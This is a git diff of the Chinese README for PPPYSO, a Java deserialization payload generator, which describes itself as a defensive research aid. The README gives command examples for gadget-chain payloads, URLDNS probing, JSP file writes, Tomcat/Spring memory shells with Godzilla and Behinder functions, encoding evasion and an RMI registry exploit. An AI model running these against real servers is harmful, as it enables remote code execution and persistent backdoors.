@@ -2,18 +2,17 @@
 
 By. Whoopsunix
 
-# 🚩Introduction
+# 🌏 Begin
 
-PPPYSO 是一个 Java 反序列化概念验证框架，可以根据配置生成各种增强 Payload，通过动态代理的方式实现 JavaClass 增强减少依赖的同时兼容
-`javax/jakarta` 标准。
++ 🗿 PPPYSO 是一个Java 反序列化概念验证框架，仅为安全防护研究提供参考，所以不会开放任何绕过性质的研究成果，并且不保证稳定性。基于子项目 [JavaRce](https://github.com/Whoopsunix/JavaRce) 实现，最终目的是实现 [RASP](https://github.com/Whoopsunix/PPPRASP) 层面的拦截。
 
-框架分模块构建，每个模块通过一个 Helper 来管理生成内容，包含以下模块：
++ 👏 欢迎 issue 
+
+框架分模块构建，每个模块通过一个 Helper 来管理生成内容，可以根据配置生成各种增强 Payload，通过动态代理的方式实现 JavaClass 增强减少依赖的同时兼容 `javax/jakarta` 标准。包含以下模块：
 
 ### 反序列化模块
 
-参考 [Marshalling Pickles](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles) 中提到的 gadget
-chain 概念，将 [ysoserial](https://github.com/frohoff/ysoserial) 原先的调用链拆分为入口点 (kick-off), 触发点 (sink)
-，其余为中间的调用链 (chain)，针对各个部分针对性增强。
+参考 [Marshalling Pickles](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles) 中提到的 gadget chain 概念，将 [ysoserial](https://github.com/frohoff/ysoserial) 原先的调用链拆分为入口点 (kick-off), 触发点 (sink)，其余为中间的调用链 (chain)，针对各个部分针对性增强。
 
 - [x] `InvokerTransformer` 功能增强
 - [x] `TemplatesImpl` JavaClass增强、AbstractTranslet 可选移除、_bytecodes 特征消除
@@ -25,31 +24,40 @@ chain 概念，将 [ysoserial](https://github.com/frohoff/ysoserial) 原先的�
 
 ### JavaClass 模块
 
-基于子项目 [JavaRce](https://github.com/Whoopsunix/JavaRce) ，在实现上不同。PPPYSO 中通过动态代理的方式实现内存马，减少依赖的同时兼容
-javax/jakarta 标准。JavaClass 动态类名、内存马、Rce 回显。
+基于子项目 [JavaRce](https://github.com/Whoopsunix/JavaRce) ，在实现上不同。PPPYSO 中通过动态代理的方式实现内存马，减少依赖的同时兼容 javax/jakarta 标准。JavaClass 动态类名、内存马、Rce 回显。
 
 - [x] Loader + Proxy 积极测试兼容中
 - [x] 兼容 javax/jakarta 标准
 - [x] 结果增强输出，eg. SPEL+FreeMarker
   - [x] 高版本 JDK 下 SPEL 注入
 - [x] 功能增强积极增加中 Exec、Godzilla、Behinder、Sou5
-- [x] Unsafe 实现高版本 JDK 字节码加载兼容
+- [x] Unsafe 实现 JDK 17+ 字节码加载（name module 反射限制绕过）
 
-### common 模板
+### Common 模板
 
-实现序列化数据的加解密、序列化、WAF 绕过等功能
+实现序列化数据的加解密、序列化等功能
 
 - [x] 序列化：原生、XStream、HexAscii
-- [x] WAF 绕过：UTF8Mix 2 3 字节加密
+- [x] 序列化类型：UTF8Mix 2 3 字节转换
 - [x] 支持组合结果输出：文件、Base64、GZIP，eg. gzip,base64 
+
+### Exploit 模块
+
+- [ ] 缓慢移植
+
+
 
 ### 交互
 
 目前支持 CLI、Yaml 配置，通过
 
-直接运行生成模板配置文件
+直接运行生成模板配置文件，并展示支持的调用链
 
 ![image-20240416174431675](attachments/image-20240416174431675.png)
+
+[WIKI](https://whoopsunix.com/docs/category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90) 里~~调用链的分析比较久远也可以看看~~，之后有时间会尽量补全 gadget chain 图
+
+![Gadget ChainBy. Whoopsunix](attachments/Gadget-ChainBy-Whoopsunix.png)
 
 Cli 通过 `java -jar PPPYSO-{version}-jar-with-dependencies.jar -g Coherence1 {-h | -help}` 获取帮助信息
 
@@ -57,8 +65,7 @@ Cli 通过 `java -jar PPPYSO-{version}-jar-with-dependencies.jar -g Coherence1 {
 
 ### 编译
 
-项目完全开源，可直接下载 Release 版本，或自行编译，编译成功后在 scheduler/target
-下生成 `PPPYSO-${version}-jar-with-dependencies.jar`
+项目完全开源，可直接下载 Release 版本，或自行编译，编译成功后在 scheduler/target 下生成 `PPPYSO-${version}-jar-with-dependencies.jar`
 
 ```
 # 安装依赖
@@ -66,12 +73,6 @@ mvn clean
 # 打包
 mvn clean package -Dmaven.test.skip
 ```
-
-# 🌏 0x00 Begin
-
-🗿 PPPYSO 是一个概念验证框架，仅为安全研究提供参考，不保证稳定性。
-
-👏 欢迎 issue
 
 # 0x01 URLDNS 增强
 
@@ -83,15 +84,15 @@ mvn clean package -Dmaven.test.skip
 -ds
 ```
 
-URLDNS 支持组件利用链探测和类探测
+URLDNS 支持组件利用链探测和类探测，还在完善中
 
 ## 组件探测
 
-组件探测参考 [Urldns ](https://github.com/kezibei/Urldns)项目实现，改了一些类可以通过 `-dp show` 展示目前规则已写的类
+组件探测参考 [Urldns ](https://github.com/kezibei/Urldns)项目实现，改了一些类可以通过 `-show` 展示目前规则已写的类
+
+![image-20240515103534792](attachments/image-20240515103534792.png)
 
 + `-dp` 指定组件，`all` 探测所有
-
-![image-20240423142525765](attachments/image-20240423142525765.png)
 
 eg. `-g URLDNS -host 7ox24q.dnslog.cn -dp "all"`
 
@@ -228,8 +229,7 @@ eg. `-g commonscollections1 -e FileWrite -sfp /tmp/1.jsp -fc 123456`
 
 ![image-20240419143818623](attachments/image-20240419143818623.png)
 
-`-split` 设置文件分片后生成， `-part` 指定每个分片的大小，默认 100kb。不过该功能不建议用在 `TemplatesImpl` 增强的链，用
-Base64 编码只能分片很小。
+`-split` 设置文件分片后生成， `-part` 指定每个分片的大小，默认 100kb。不过该功能不建议用在 `TemplatesImpl` 增强的链，用 Base64 编码只能分片很小。
 
 eg. `-g commonscollections1 -e FileWrite -sfp /tmp/itest -lfp /tmp/iox -split -part 1000`
 
@@ -352,8 +352,7 @@ eg. `-g commonscollections2 -e JavaClass -jht MemShell -mw Tomcat -ms Listener -
 
 ## LocalLoad 本地字节码加载
 
-`InvokerTransformer` 增强的链子也提供了加载字节码的方式，默认采用
-ScriptEngineManager，也可以选择 `org.mozilla.javascript.DefiningClassLoader.defineClass()`
+`InvokerTransformer` 增强的链子也提供了加载字节码的方式，默认采用 ScriptEngineManager，~~也可以选择（换汤不换药 懒得删了）~~ `org.mozilla.javascript.DefiningClassLoader.defineClass()` 
 
 ```
 -lf [Default | RHINO]
@@ -375,7 +374,7 @@ JavaClass 也可以单独生成，并且提供加密封装
 
 eg. `-e JavaClass -jht MemShell -mw Tomcat -ms Listener -msf Exec -je FreeMarker`
 
-某 FreeMarker 高版本 JDK 环境利用 `-e JavaClass -jht MemShell -mw Spring -ms Interceptor -msf Godzilla -je SPEL,FreeMarker -jme JDK17 -mt raw`
+eg. 某 FreeMarker 高版本 JDK 环境利用 `-e JavaClass -jht MemShell -mw Spring -ms Interceptor -msf Godzilla -je SPEL,FreeMarker -jme JDK17 -mt raw`
 
 ![image-20240504120717253](attachments/image-20240504120717253.png)
 
@@ -439,11 +438,19 @@ eg. `-g ROME -cmd "open -a Calculator.app" -wrap`
 
 ![image-20240427155050391](attachments/image-20240427155050391.png)
 
-# 调用链学习
+# 0x06 Exploit 模块
 
-附上一张 gadget chain 图
+在 gadget 增强的前面拼接 exp 使用该模块 ，`exp -show` 查看支持的 EXP
 
-![Gadget ChainBy. Whoopsunix](attachments/Gadget-ChainBy-Whoopsunix.png)
+![image-20240515111004602](attachments/image-20240515111004602.png)
+
+
+
+eg.  `exp RMIRegistryExploit -g CommonsCollections2 -cmd "open -a Calculator.app" -ehost 127.0.0.1 -eport 1099`
+
+![image-20240515095932731](attachments/image-20240515095932731.png)
+
+
 
 # Thanks
 
